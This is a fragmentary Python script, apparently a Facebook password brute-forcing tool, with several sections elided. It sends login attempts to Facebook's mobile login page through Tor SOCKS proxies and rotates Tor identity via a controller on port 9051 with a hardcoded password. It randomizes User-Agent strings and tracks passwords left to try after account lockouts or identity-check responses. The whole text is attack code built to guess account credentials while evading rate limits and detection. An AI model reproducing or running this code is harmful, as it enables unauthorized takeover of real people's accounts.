...
proxy,post_url,headers,payload,cookie={"http":"socks5://localhost:9050","https":'socks4://localhost:9050'},'https://m.facebook.com/login.php',{'User-Agent':random.choice(open('user-agents.txt').read().splitlines()),'Accept-Language':'en-US,en;q=0.5'},{},{}
...
l = 1
if IP == 'n' or IP == 'N':l = ''
if os.path.exists('response.txt'):os.remove('response.txt')
...
def function(email,passw):
	...
	with Controller.from_port(port = 9051) as c:
		c.authenticate(password='Heroof2018')
		...
		if 'Facebook ' in clean[:9] or 'Please confirm your identity' in clean or 'Your account has been temporarily locked' in clean:
			...
			open('left_password.txt','a').write(passw+'\n')
